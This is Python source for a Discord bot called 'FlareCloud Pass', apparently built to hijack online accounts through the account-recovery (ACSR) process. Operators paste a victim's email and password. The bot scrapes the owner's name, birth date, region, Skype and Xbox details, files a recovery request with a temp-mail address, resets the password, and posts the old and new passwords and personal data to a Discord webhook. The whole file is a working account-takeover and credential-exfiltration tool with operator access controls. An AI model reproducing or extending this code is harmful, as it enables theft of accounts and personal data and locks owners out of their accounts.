"""
FlareCloud Pass — Discord bot (clean build from your new file)
"""

import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import json
import os
import sys
import random
import traceback
import time
import urllib.request
from datetime import datetime, timedelta
from threading import Thread
from flask import Flask

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from automation.core import scrape_account_info
    from automation.acsr import submit_acsr_form
    from automation.acsr_continue import continue_acsr_flow
    from automation.reset_password import perform_password_reset
    from automation.captcha import download_captcha
    import tempmail  # noqa: F401
except ImportError as e:
    print(f"Warning: automation import: {e}")

# ==================== CONFIG ====================
ADMIN_IDS = {
    1541659394188509215,  # you
    1398979148063571989,
    1550540531665473699,
}
AUTHORIZED_ROLE_ID = 1558345972516392970

CONFIG_FILE = "bot_config.json"
AUTHORIZED_USERS_FILE = "authorized_users.json"
STATS_FILE = "bot_stats.json"

COLOR_PRIMARY = 0x7B2CBF
COLOR_SUCCESS = 0x10B981
COLOR_ERROR = 0xEF4444
COLOR_WARNING = 0xF59E0B
COLOR_INFO = 0x3B82F6


class BotDataManager:
    def __init__(self):
        self.config = self.load_json(CONFIG_FILE, {
            "webhook_url": "",
            "bot_enabled": True,
            "max_concurrent_users": 10,
        })
        self.authorized_users = self.load_json(
            AUTHORIZED_USERS_FILE,
            {
                str(uid): {
                    "authorized": True,
                    "added_by": "system",
                    "added_at": str(datetime.now()),
                }
                for uid in ADMIN_IDS
            },
        )
        self.active_sessions = {}
        self.otp_data = {}
        self.processing_sessions = {}
        self.stats = self.load_json(
            STATS_FILE,
            {
                "total_processed": 0,
                "total_success": 0,
                "total_failed": 0,
                "users_served": {},
            },
        )

    def load_json(self, filename, default):
        if os.path.exists(filename):
            try:
                with open(filename, "r") as f:
                    return json.load(f)
            except Exception:
                pass
        return default

    def save_json(self, filename, data):
        with open(filename, "w") as f:
            json.dump(data, f, indent=2)

    def save_config(self):
        self.save_json(CONFIG_FILE, self.config)

    def save_authorized_users(self):
        self.save_json(AUTHORIZED_USERS_FILE, self.authorized_users)

    def save_stats(self):
        self.save_json(STATS_FILE, self.stats)

    def is_authorized(self, user_id, member=None):
        try:
            if int(user_id) in ADMIN_IDS:
                return True
        except Exception:
            pass
        row = self.authorized_users.get(str(user_id))
        if row and row.get("authorized"):
            return True
        if member is not None:
            try:
                if AUTHORIZED_ROLE_ID in [r.id for r in getattr(member, "roles", [])]:
                    return True
            except Exception:
                pass
        return False

    def authorize_user(self, user_id, by_admin):
        self.authorized_users[str(user_id)] = {
            "authorized": True,
            "added_by": str(by_admin),
            "added_at": str(datetime.now()),
        }
        self.save_authorized_users()

    def revoke_user(self, user_id):
        if str(user_id) in self.authorized_users:
            del self.authorized_users[str(user_id)]
            self.save_authorized_users()

    def generate_otp(self, user_id):
        otp = "".join(str(random.randint(0, 9)) for _ in range(6))
        self.otp_data[user_id] = {
            "otp": otp,
            "expires": datetime.now() + timedelta(minutes=5),
            "attempts": 0,
        }
        return otp

    def verify_otp(self, user_id, otp):
        if user_id not in self.otp_data:
            return False, "No OTP requested. Use `/request_otp` first."
        data = self.otp_data[user_id]
        if datetime.now() > data["expires"]:
            del self.otp_data[user_id]
            return False, "OTP expired. Request a new one."
        if data["attempts"] >= 3:
            del self.otp_data[user_id]
            return False, "Maximum attempts exceeded."
        if data["otp"] == otp:
            del self.otp_data[user_id]
            self.active_sessions[user_id] = {
                "authenticated": True,
                "auth_time": datetime.now(),
            }
            return True, "Authentication successful!"
        data["attempts"] += 1
        return False, f"Invalid OTP. {3 - data['attempts']} attempts remaining."

    def is_authenticated(self, user_id):
        try:
            if int(user_id) in ADMIN_IDS:
                return True
        except Exception:
            pass
        if user_id not in self.active_sessions:
            return False
        session = self.active_sessions[user_id]
        auth_time = session.get("auth_time")
        if isinstance(auth_time, str):
            auth_time = datetime.fromisoformat(auth_time)
        if datetime.now() - auth_time > timedelta(hours=24):
            del self.active_sessions[user_id]
            return False
        return True

    def logout(self, user_id):
        self.active_sessions.pop(user_id, None)

    def update_stats(self, user_id, success):
        self.stats["total_processed"] += 1
        if success:
            self.stats["total_success"] += 1
        else:
            self.stats["total_failed"] += 1
        u = str(user_id)
        if u not in self.stats["users_served"]:
            self.stats["users_served"][u] = {"processed": 0, "success": 0}
        self.stats["users_served"][u]["processed"] += 1
        if success:
            self.stats["users_served"][u]["success"] += 1
        self.save_stats()


def generate_flare_password():
    return "Flare" + "".join(str(random.randint(0, 9)) for _ in range(6))


intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
data_manager = BotDataManager()


def interaction_member(interaction: discord.Interaction):
    try:
        if isinstance(interaction.user, discord.Member):
            return interaction.user
        if interaction.guild:
            return interaction.guild.get_member(interaction.user.id)
    except Exception:
        pass
    return None


def is_admin(user_id, member=None):
    try:
        if int(user_id) in ADMIN_IDS:
            return True
    except Exception:
        pass
    if member is not None:
        try:
            if AUTHORIZED_ROLE_ID in [r.id for r in getattr(member, "roles", [])]:
                return True
        except Exception:
            pass
    return False


def e(name: str, fallback: str = "") -> str:
    try:
        em = discord.utils.get(bot.emojis, name=name)
        if em is None:
            low = name.lower()
            for x in bot.emojis:
                if x.name.lower() == low:
                    em = x
                    break
        if em is not None:
            return str(em)
    except Exception:
        pass
    return fallback or f":{name}:"


def create_embed(title, description, color, fields=None):
    embed = discord.Embed(
        title=title,
        description=description,
        color=color,
        timestamp=datetime.now(),
    )
    if fields:
        for field in fields:
            embed.add_field(
                name=field.get("name", "Field"),
                value=field.get("value", "—"),
                inline=field.get("inline", False),
            )
    embed.set_footer(text="FlareCloud Pass • ACSR")
    return embed


async def send_to_webhook(result):
    webhook_url = data_manager.config.get("webhook_url")
    if not webhook_url:
        return
    import aiohttp

    payload = {
        "embeds": [
            {
                "title": f"{e('tick', '✅')} Password Changed",
                "color": COLOR_SUCCESS,
                "fields": [
                    {"name": f"{e('mail', '📧')} Email", "value": f"`{result['email']}`", "inline": False},
                    {"name": f"{e('password', '🔓')} Old", "value": f"`{result['old_password']}`", "inline": True},
                    {"name": f"{e('password', '🔒')} New", "value": f"`{result['new_password']}`", "inline": True},
                    {"name": "Name", "value": str(result.get("name", "N/A")), "inline": True},
                    {"name": "DOB", "value": str(result.get("dob", "N/A")), "inline": True},
                    {"name": "Region", "value": str(result.get("region", "N/A")), "inline": True},
                    {"name": "Skype", "value": str(result.get("skype_id", "N/A")), "inline": True},
                    {"name": "Xbox", "value": str(result.get("gamertag", "N/A")), "inline": True},
                ],
                "footer": {"text": f"User {result.get('user_id', '?')}"},
                "timestamp": datetime.now().isoformat(),
            }
        ]
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(webhook_url, json=payload) as resp:
                print(f"Webhook status {resp.status}")
    except Exception as err:
        print(f"Webhook error: {err}")


async def process_account_full(email, password, user_id, channel):
    try:
        await channel.send(
            embed=create_embed(
                f"{e('loading', '🔍')} Step 1/5: Scraping",
                f"Logging into `{email}`…",
                COLOR_INFO,
            )
        )
        loop = asyncio.get_event_loop()
        account_info = await loop.run_in_executor(None, scrape_account_info, email, password)

        if not account_info or account_info.get("error"):
            err = (account_info or {}).get("error", "Could not login")
            await channel.send(
                embed=create_embed(
                    f"{e('Wrong', '❌')} Login Failed",
                    f"**Error:** {err}\n**Account:** `{email}`",
                    COLOR_ERROR,
                )
            )
            data_manager.update_stats(user_id, False)
            return

        await channel.send(
            embed=create_embed(
                f"{e('Accounts', '📝')} Step 2/5: ACSR Form",
                f"Scraped **{account_info.get('name', 'Unknown')}** — submitting recovery…",
                COLOR_INFO,
            )
        )
        captcha_image, driver, token, temp_email = await loop.run_in_executor(
            None, submit_acsr_form, account_info
        )
        if not captcha_image or not driver:
            await channel.send(
                embed=create_embed(
                    f"{e('Wrong', '❌')} ACSR Failed",
                    "Could not submit ACSR form.",
                    COLOR_ERROR,
                )
            )
            data_manager.update_stats(user_id, False)
            return

        captcha_filename = f"captcha_{user_id}_{int(datetime.now().timestamp())}.png"
        captcha_image.seek(0)
        with open(captcha_filename, "wb") as f:
            f.write(captcha_image.read())

        data_manager.processing_sessions[user_id] = {
            "driver": driver,
            "token": token,
            "temp_email": temp_email,
            "account_info": account_info,
            "email": email,
            "password": password,
            "captcha_file": captcha_filename,
            "captcha_attempts": 0,
            "channel_id": channel.id,
            "start_time": datetime.now(),
        }

        await channel.send(
            embed=create_embed(
                f"{e('captcha', '🖼️')} Step 3/5: CAPTCHA",
                f"**Solve the CAPTCHA**\nUse `/submit_captcha <text>`",
                COLOR_WARNING,
                [
                    {"name": "Timeout", "value": "5 min", "inline": True},
                    {"name": "Attempts", "value": "3 max", "inline": True},
                ],
            ),
            file=discord.File(captcha_filename),
        )
    except Exception as err:
        traceback.print_exc()
        await channel.send(
            embed=create_embed(
                f"{e('Wrong', '❌')} Error",
                str(err),
                COLOR_ERROR,
            )
        )
        data_manager.update_stats(user_id, False)


async def continue_after_captcha(user_id, captcha_text, interaction):
    if user_id not in data_manager.processing_sessions:
        await interaction.response.send_message(
            embed=create_embed(
                f"{e('Wrong', '❌')} No Session",
                "No active CAPTCHA session.",
                COLOR_ERROR,
            ),
            ephemeral=True,
        )
        return

    session = data_manager.processing_sessions[user_id]
    driver = session["driver"]
    token = session["token"]
    account_info = session["account_info"]
    email = session["email"]
    password = session["password"]
    channel = bot.get_channel(session["channel_id"])

    try:
        await interaction.response.defer(ephemeral=True)
        await channel.send(
            embed=create_embed(
                f"{e('loading', '⚙️')} Step 4/5: ACSR continue",
                "Submitting CAPTCHA + waiting for temp-mail OTP…",
                COLOR_INFO,
            )
        )
        loop = asyncio.get_event_loop()
        reset_link = await loop.run_in_executor(
            None, continue_acsr_flow, driver, account_info, token, captcha_text, user_id
        )

        if reset_link == "CAPTCHA_RETRY_NEEDED":
            session["captcha_attempts"] += 1
            if session["captcha_attempts"] >= 3:
                await channel.send(
                    embed=create_embed(
                        f"{e('Wrong', '❌')} Max CAPTCHA attempts",
                        "Start again with `/process`.",
                        COLOR_ERROR,
                    )
                )
                await interaction.followup.send(
                    embed=create_embed(f"{e('Wrong', '❌')} Failed", "Max CAPTCHA attempts.", COLOR_ERROR),
                    ephemeral=True,
                )
                try:
                    driver.quit()
                except Exception:
                    pass
                if os.path.exists(session["captcha_file"]):
                    os.remove(session["captcha_file"])
                del data_manager.processing_sessions[user_id]
                data_manager.update_stats(user_id, False)
                return

            new_captcha = await loop.run_in_executor(None, download_captcha, driver)
            new_name = f"captcha_{user_id}_{int(datetime.now().timestamp())}.png"
            new_captcha.seek(0)
            with open(new_name, "wb") as f:
                f.write(new_captcha.read())
            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            session["captcha_file"] = new_name
            await channel.send(
                embed=create_embed(
                    f"{e('Wrong', '❌')} Wrong CAPTCHA",
                    f"Attempts left: **{3 - session['captcha_attempts']}**",
                    COLOR_WARNING,
                ),
                file=discord.File(new_name),
            )
            await interaction.followup.send(
                embed=create_embed(f"{e('Wrong', '❌')} Try again", "CAPTCHA incorrect.", COLOR_WARNING),
                ephemeral=True,
            )
            return

        if not reset_link or (isinstance(reset_link, str) and reset_link.startswith("ERROR")):
            await channel.send(
                embed=create_embed(
                    f"{e('Wrong', '❌')} ACSR Failed",
                    str(reset_link),
                    COLOR_ERROR,
                )
            )
            await interaction.followup.send(
                embed=create_embed(f"{e('Wrong', '❌')} Failed", str(reset_link), COLOR_ERROR),
                ephemeral=True,
            )
            try:
                driver.quit()
            except Exception:
                pass
            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            del data_manager.processing_sessions[user_id]
            data_manager.update_stats(user_id, False)
            return

        new_password = generate_flare_password()
        await channel.send(
            embed=create_embed(
                f"{e('password', '🔒')} Step 5/5: Reset password",
                f"Setting password to `{new_password}`…",
                COLOR_INFO,
            )
        )
        actual_password = await loop.run_in_executor(
            None, perform_password_reset, reset_link, email, new_password
        )
        if not actual_password:
            await channel.send(
                embed=create_embed(
                    f"{e('Wrong', '❌')} Reset failed",
                    "Could not change password.",
                    COLOR_ERROR,
                )
            )
            await interaction.followup.send(
                embed=create_embed(f"{e('Wrong', '❌')} Failed", "Password reset failed.", COLOR_ERROR),
                ephemeral=True,
            )
            try:
                driver.quit()
            except Exception:
                pass
            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            del data_manager.processing_sessions[user_id]
            data_manager.update_stats(user_id, False)
            return

        result = {
            "email": email,
            "old_password": password,
            "new_password": actual_password,
            "name": account_info.get("name"),
            "dob": account_info.get("dob"),
            "region": account_info.get("region"),
            "skype_id": account_info.get("skype_id"),
            "skype_email": account_info.get("skype_email"),
            "gamertag": account_info.get("gamertag"),
            "user_id": user_id,
        }
        await send_to_webhook(result)
        data_manager.update_stats(user_id, True)
        await channel.send(
            embed=create_embed(
                f"{e('tick', '✅')} SUCCESS",
                f"**Account:** `{email}`",
                COLOR_SUCCESS,
                [
                    {"name": f"{e('password', '🔓')} Old", "value": f"`{password}`", "inline": True},
                    {"name": f"{e('password', '🔒')} New", "value": f"`{actual_password}`", "inline": True},
                ],
            )
        )
        await interaction.followup.send(
            embed=create_embed(
                f"{e('tick', '✅')} Complete",
                f"`{email}` → `{actual_password}`",
                COLOR_SUCCESS,
            ),
            ephemeral=True,
        )
        try:
            driver.quit()
        except Exception:
            pass
        if os.path.exists(session["captcha_file"]):
            os.remove(session["captcha_file"])
        del data_manager.processing_sessions[user_id]
    except Exception as err:
        traceback.print_exc()
        try:
            await channel.send(
                embed=create_embed(f"{e('Wrong', '❌')} Error", str(err), COLOR_ERROR)
            )
            await interaction.followup.send(
                embed=create_embed(f"{e('Wrong', '❌')} Error", str(err), COLOR_ERROR),
                ephemeral=True,
            )
        except Exception:
            pass
        try:
            driver.quit()
        except Exception:
            pass
        if user_id in data_manager.processing_sessions:
            sess = data_manager.processing_sessions.pop(user_id)
            if os.path.exists(sess.get("captcha_file", "")):
                try:
                    os.remove(sess["captcha_file"])
                except Exception:
                    pass
        data_manager.update_stats(user_id, False)


@bot.event
async def on_ready():
    print("=" * 60)
    print("FLARECLOUD PASS — ONLINE")
    print(f"User: {bot.user} ({bot.user.id})")
    print(f"Admins: {sorted(ADMIN_IDS)}")
    print(f"Role: {AUTHORIZED_ROLE_ID}")
    print("=" * 60)
    try:
        raw = os.getenv("GUILD_ID") or os.getenv("DISCORD_GUILD_ID") or ""
        # supports: one id, or comma-separated: id1,id2,id3
        guild_ids = [x.strip() for x in raw.replace(";", ",").split(",") if x.strip()]
        for gid in guild_ids:
            try:
                g = discord.Object(id=int(gid))
                bot.tree.copy_global_to(guild=g)
                synced = await bot.tree.sync(guild=g)
                print(f"Synced {len(synced)} commands → guild {gid}")
            except Exception as ge:
                print(f"Guild sync failed for {gid}: {ge}")
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} global commands")
    except Exception as err:
        print(f"Sync error: {err}")
    await bot.change_presence(
        activity=discord.Activity(type=discord.ActivityType.watching, name="FlareCloud Pass | /help")
    )


@bot.tree.error
async def on_app_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    print(f"Command error: {error}")
    traceback.print_exc()
    msg = str(error)[:500]
    try:
        if interaction.response.is_done():
            await interaction.followup.send(msg, ephemeral=True)
        else:
            await interaction.response.send_message(msg, ephemeral=True)
    except Exception:
        pass


def check_auth():
    async def predicate(interaction: discord.Interaction) -> bool:
        member = interaction_member(interaction)
        if data_manager.is_authorized(interaction.user.id, member):
            return True
        try:
            await interaction.response.send_message(
                embed=create_embed(
                    f"{e('Wrong', '❌')} Not Authorized",
                    "Need access (admin or staff role).",
                    COLOR_ERROR,
                ),
                ephemeral=True,
            )
        except Exception:
            pass
        return False

    return app_commands.check(predicate)


def check_login():
    async def predicate(interaction: discord.Interaction) -> bool:
        if data_manager.is_authenticated(interaction.user.id):
            return True
        try:
            await interaction.response.send_message(
                embed=create_embed(
                    f"{e('Wrong', '❌')} Not Logged In",
                    f"Use {e('password', '🔐')} `/request_otp` then `/verify_otp`.",
                    COLOR_ERROR,
                ),
                ephemeral=True,
            )
        except Exception:
            pass
        return False

    return app_commands.check(predicate)


@bot.tree.command(name="help", description="Commands & how to use")
async def help_command(interaction: discord.Interaction):
    if not data_manager.is_authorized(interaction.user.id, interaction_member(interaction)):
        await interaction.response.send_message(
            embed=create_embed(
                f"{e('Wrong', '❌')} Not Authorized",
                "Contact an admin.",
                COLOR_ERROR,
            ),
            ephemeral=True,
        )
        return
    embed = discord.Embed(
        title=f"{e('emoji_1', '📚')} FlareCloud Pass",
        description=f"**ACSR automation** — {e('service', '⚡')}",
        color=COLOR_PRIMARY,
    )
    embed.add_field(
        name=f"{e('password', '🔐')} Auth",
        value="`/request_otp` · `/verify_otp` · `/logout`",
        inline=False,
    )
    embed.add_field(
        name=f"{e('loading', '🔧')} Process",
        value="`/process email:pass` · `/submit_captcha` · `/status` · `/cancel`",
        inline=False,
    )
    if is_admin(interaction.user.id, interaction_member(interaction)):
        embed.add_field(
            name=f"{e('Admin', '🛡️')} Admin",
            value="`/admin` `/authorize` `/revoke` `/list_users` `/set_webhook` `/stats`",
            inline=False,
        )
    embed.add_field(
        name=f"{e('tick', '✅')} Flow",
        value=(
            "1 `/request_otp` → DM code\n"
            "2 `/verify_otp <code>`\n"
            "3 `/process email:pass`\n"
            "4 Solve CAPTCHA → `/submit_captcha text`\n"
            "5 Done — new password posted"
        ),
        inline=False,
    )
    embed.set_footer(text="FlareCloud Pass • ACSR")
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="request_otp", description="Get OTP in DM (admins auto-login)")
@check_auth()
async def request_otp(interaction: discord.Interaction):
    try:
        await interaction.response.defer(ephemeral=True)
    except Exception:
        return
    uid = interaction.user.id
    if uid in ADMIN_IDS:
        data_manager.active_sessions[uid] = {
            "authenticated": True,
            "auth_time": datetime.now(),
        }
        await interaction.followup.send(
            embed=create_embed(
                f"{e('tick', '✅')} Admin session",
                "Already logged in. Use `/process`.",
                COLOR_SUCCESS,
            ),
            ephemeral=True,
        )
        return
    if data_manager.is_authenticated(uid):
        await interaction.followup.send(
            embed=create_embed(
                f"{e('tick', '✅')} Already in",
                "You are authenticated.",
                COLOR_INFO,
            ),
            ephemeral=True,
        )
        return
    otp = data_manager.generate_otp(uid)
    try:
        await interaction.user.send(
            embed=create_embed(
                f"{e('password', '🔐')} OTP",
                f"Code: **`{otp}`**\nExpires in 5 minutes.\nThen `/verify_otp {otp}`",
                COLOR_WARNING,
            )
        )
        await interaction.followup.send(
            embed=create_embed(
                f"{e('tick', '✅')} Sent",
                "Check your DMs.",
                COLOR_SUCCESS,
            ),
            ephemeral=True,
        )
    except discord.Forbidden:
        await interaction.followup.send(
            embed=create_embed(
                f"{e('Wrong', '❌')} DM blocked",
                f"Enable DMs. Code: `{otp}`",
                COLOR_ERROR,
            ),
            ephemeral=True,
        )


@bot.tree.command(name="verify_otp", description="Verify OTP")
@app_commands.describe(code="6-digit code from DM")
@check_auth()
async def verify_otp(interaction: discord.Interaction, code: str):
    ok, msg = data_manager.verify_otp(interaction.user.id, code.strip())
    if ok:
        await interaction.response.send_message(
            embed=create_embed(
                f"{e('tick', '✅')} Authenticated",
                f"{msg}\nUse `/process` now.",
                COLOR_SUCCESS,
            )
        )
    else:
        await interaction.response.send_message(
            embed=create_embed(f"{e('Wrong', '❌')} Failed", msg, COLOR_ERROR),
            ephemeral=True,
        )


@bot.tree.command(name="logout", description="End session")
@check_login()
async def logout_command(interaction: discord.Interaction):
    data_manager.logout(interaction.user.id)
    await interaction.response.send_message(
        embed=create_embed(
            f"{e('tick', '👋')} Logged out",
            "Use `/request_otp` to login again.",
            COLOR_INFO,
        )
    )


@bot.tree.command(name="process", description="Start ACSR — email:password")
@app_commands.describe(account="email:password")
@check_login()
async def process_account(interaction: discord.Interaction, account: str):
    try:
        await interaction.response.defer(ephemeral=False)
    except Exception:
        pass

    async def reply(embed):
        try:
            if interaction.response.is_done():
                await interaction.followup.send(embed=embed)
            else:
                await interaction.response.send_message(embed=embed)
        except Exception as err:
            print("process reply:", err)

    uid = interaction.user.id
    if ":" not in account:
        await reply(
            create_embed(
                f"{e('Wrong', '❌')} Format",
                "Use `email:password`",
                COLOR_ERROR,
            )
        )
        return
    email, password = account.split(":", 1)
    email, password = email.strip(), password.strip()
    if uid in data_manager.processing_sessions:
        await reply(
            create_embed(
                f"{e('Wrong', '❌')} Busy",
                "Finish or `/cancel` first.",
                COLOR_WARNING,
            )
        )
        return
    await reply(
        create_embed(
            f"{e('loading', '🚀')} Starting",
            f"{e('mail', '📧')} `{email}`\nUpdates in this channel.",
            COLOR_INFO,
        )
    )
    asyncio.create_task(process_account_full(email, password, uid, interaction.channel))


@bot.tree.command(name="submit_captcha", description="Submit CAPTCHA text")
@app_commands.describe(text="Text in the image")
@check_login()
async def submit_captcha(interaction: discord.Interaction, text: str):
    if interaction.user.id not in data_manager.processing_sessions:
        await interaction.response.send_message(
            embed=create_embed(
                f"{e('Wrong', '❌')} No CAPTCHA",
                "No active session.",
                COLOR_WARNING,
            ),
            ephemeral=True,
        )
        return
    await continue_after_captcha(interaction.user.id, text.strip(), interaction)


@bot.tree.command(name="status", description="Session status")
@check_login()
async def check_status(interaction: discord.Interaction):
    uid = interaction.user.id
    fields = [
        {
            "name": f"{e('password', '🔒')} Auth",
            "value": f"{e('tick', '✅')} Logged in",
            "inline": True,
        }
    ]
    if uid in data_manager.processing_sessions:
        s = data_manager.processing_sessions[uid]
        fields.append(
            {
                "name": f"{e('captcha', '⏳')} Process",
                "value": "CAPTCHA pending",
                "inline": True,
            }
        )
        fields.append(
            {
                "name": f"{e('mail', '📧')} Email",
                "value": f"`{s['email']}`",
                "inline": False,
            }
        )
        fields.append(
            {
                "name": "Attempts",
                "value": f"{s['captcha_attempts']} / 3",
                "inline": True,
            }
        )
        embed = create_embed(
            f"{e('loading', '⚠️')} Active",
            "CAPTCHA pending.",
            COLOR_WARNING,
            fields,
        )
    else:
        fields.append({"name": "Process", "value": "None", "inline": True})
        embed = create_embed(
            f"{e('tick', '✅')} Ready",
            "Ready for `/process`.",
            COLOR_SUCCESS,
            fields,
        )
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="cancel", description="Cancel active process")
@check_login()
async def cancel_process(interaction: discord.Interaction):
    uid = interaction.user.id
    if uid not in data_manager.processing_sessions:
        await interaction.response.send_message(
            embed=create_embed(
                f"{e('tick', 'ℹ️')} Nothing",
                "No active process.",
                COLOR_INFO,
            ),
            ephemeral=True,
        )
        return
    session = data_manager.processing_sessions.pop(uid)
    try:
        session["driver"].quit()
    except Exception:
        pass
    if os.path.exists(session.get("captcha_file", "")):
        try:
            os.remove(session["captcha_file"])
        except Exception:
            pass
    await interaction.response.send_message(
        embed=create_embed(
            f"{e('tick', '✅')} Cancelled",
            "Session ended.",
            COLOR_SUCCESS,
        )
    )


@bot.tree.command(name="admin", description="[ADMIN] Panel")
async def admin_panel(interaction: discord.Interaction):
    if not is_admin(interaction.user.id, interaction_member(interaction)):
        await interaction.response.send_message(
            embed=create_embed(f"{e('Wrong', '❌')} Denied", "Admin only.", COLOR_ERROR),
            ephemeral=True,
        )
        return
    st = data_manager.stats
    await interaction.response.send_message(
        embed=create_embed(
            f"{e('Admin', '🛡️')} Admin",
            "FlareCloud Pass",
            COLOR_PRIMARY,
            [
                {
                    "name": "Users",
                    "value": f"**Auth:** {len(data_manager.authorized_users)}\n**Sessions:** {len(data_manager.active_sessions)}\n**Processes:** {len(data_manager.processing_sessions)}",
                    "inline": True,
                },
                {
                    "name": "Stats",
                    "value": f"**Total:** {st['total_processed']}\n**OK:** {st['total_success']}\n**Fail:** {st['total_failed']}",
                    "inline": True,
                },
            ],
        ),
        ephemeral=True,
    )


@bot.tree.command(name="authorize", description="[ADMIN] Grant access")
@app_commands.describe(user="User to authorize")
async def authorize_user(interaction: discord.Interaction, user: discord.User):
    if not is_admin(interaction.user.id, interaction_member(interaction)):
        await interaction.response.send_message(
            embed=create_embed(f"{e('Wrong', '❌')} Denied", "Admin only.", COLOR_ERROR),
            ephemeral=True,
        )
        return
    data_manager.authorize_user(user.id, interaction.user.id)
    await interaction.response.send_message(
        embed=create_embed(
            f"{e('tick', '✅')} Authorized",
            f"{user.mention} can use the bot.",
            COLOR_SUCCESS,
        )
    )


@bot.tree.command(name="revoke", description="[ADMIN] Remove access")
@app_commands.describe(user="User to revoke")
async def revoke_user(interaction: discord.Interaction, user: discord.User):
    if not is_admin(interaction.user.id, interaction_member(interaction)):
        await interaction.response.send_message(
            embed=create_embed(f"{e('Wrong', '❌')} Denied", "Admin only.", COLOR_ERROR),
            ephemeral=True,
        )
        return
    if user.id in ADMIN_IDS:
        await interaction.response.send_message(
            embed=create_embed(f"{e('Wrong', '❌')} Error", "Cannot revoke permanent admin.", COLOR_ERROR),
            ephemeral=True,
        )
        return
    data_manager.revoke_user(user.id)
    await interaction.response.send_message(
        embed=create_embed(
            f"{e('tick', '✅')} Revoked",
            f"{user.mention} removed.",
            COLOR_SUCCESS,
        )
    )


@bot.tree.command(name="list_users", description="[ADMIN] List authorized users")
async def list_users(interaction: discord.Interaction):
    if not is_admin(interaction.user.id, interaction_member(interaction)):
        await interaction.response.send_message(
            embed=create_embed(f"{e('Wrong', '❌')} Denied", "Admin only.", COLOR_ERROR),
            ephemeral=True,
        )
        return
    lines = []
    for uid in data_manager.authorized_users:
        try:
            u = await bot.fetch_user(int(uid))
            lines.append(f"• **{u.name}** (`{uid}`)")
        except Exception:
            lines.append(f"• `{uid}`")
    await interaction.response.send_message(
        embed=create_embed(
            f"{e('Accounts', '👥')} Authorized",
            "\n".join(lines) or "None",
            COLOR_PRIMARY,
        ),
        ephemeral=True,
    )


@bot.tree.command(name="set_webhook", description="[ADMIN] Set results webhook")
@app_commands.describe(webhook_url="Discord webhook URL")
async def set_webhook(interaction: discord.Interaction, webhook_url: str):
    if not is_admin(interaction.user.id, interaction_member(interaction)):
        await interaction.response.send_message(
            embed=create_embed(f"{e('Wrong', '❌')} Denied", "Admin only.", COLOR_ERROR),
            ephemeral=True,
        )
        return
    if "discord.com/api/webhooks/" not in webhook_url:
        await interaction.response.send_message(
            embed=create_embed(f"{e('Wrong', '❌')} Invalid", "Not a Discord webhook URL.", COLOR_ERROR),
            ephemeral=True,
        )
        return
    data_manager.config["webhook_url"] = webhook_url
    data_manager.save_config()
    await interaction.response.send_message(
        embed=create_embed(f"{e('tick', '✅')} Webhook set", "Saved.", COLOR_SUCCESS),
        ephemeral=True,
    )


@bot.tree.command(name="stats", description="[ADMIN] Stats")
async def view_stats(interaction: discord.Interaction):
    if not is_admin(interaction.user.id, interaction_member(interaction)):
        await interaction.response.send_message(
            embed=create_embed(f"{e('Wrong', '❌')} Denied", "Admin only.", COLOR_ERROR),
            ephemeral=True,
        )
        return
    st = data_manager.stats
    rate = (st["total_success"] / st["total_processed"] * 100) if st["total_processed"] else 0
    await interaction.response.send_message(
        embed=create_embed(
            f"{e('emoji_1', '📊')} Stats",
            f"Success rate **{rate:.1f}%**",
            COLOR_PRIMARY,
            [
                {
                    "name": "Totals",
                    "value": f"Processed `{st['total_processed']}` · OK `{st['total_success']}` · Fail `{st['total_failed']}`",
                    "inline": False,
                }
            ],
        ),
        ephemeral=True,
    )


# ---------- Render health + start ----------
app = Flask(__name__)


@app.route("/")
@app.route("/health")
def health():
    return "FlareCloud Pass OK", 200


def run_web():
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)), threaded=True)


if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    print(f"Health port {os.environ.get('PORT', 10000)}")

    token = (os.getenv("DISCORD_TOKEN") or os.getenv("DISCORD_BOT_TOKEN") or "").strip()
    if len(token) >= 2 and token[0] == token[-1] and token[0] in ("'", '"'):
        token = token[1:-1].strip()
    if not token:
        print("FATAL: set DISCORD_TOKEN")
        while True:
            time.sleep(60)

    print(f"Token len={len(token)} starts={token[:5]!r}")

    def precheck(tok):
        req = urllib.request.Request(
            "https://discord.com/api/v10/users/@me",
            headers={"Authorization": f"Bot {tok}", "User-Agent": "FlareCloudPass"},
            method="GET",
        )
        try:
            with urllib.request.urlopen(req, timeout=20) as r:
                b = json.loads(r.read().decode())
                return True, f"OK @{b.get('username')} id={b.get('id')}"
        except Exception as err:
            code = getattr(err, "code", None)
            return False, f"HTTP {code}: {err}" if code else str(err)

    ok, info = precheck(token)
    print("Token pre-check:", info)
    while not ok:
        print("Fix DISCORD_TOKEN (401=reset, 429=wait)…")
        time.sleep(120)
        ok, info = precheck(token)
        print("Token re-check:", info)

    try:
        bot.run(token, reconnect=True)
    except discord.errors.LoginFailure:
        print("Invalid token")
        time.sleep(99999)
    except Exception as err:
        print("Fatal:", err)
        traceback.print_exc()
        time.sleep(30)
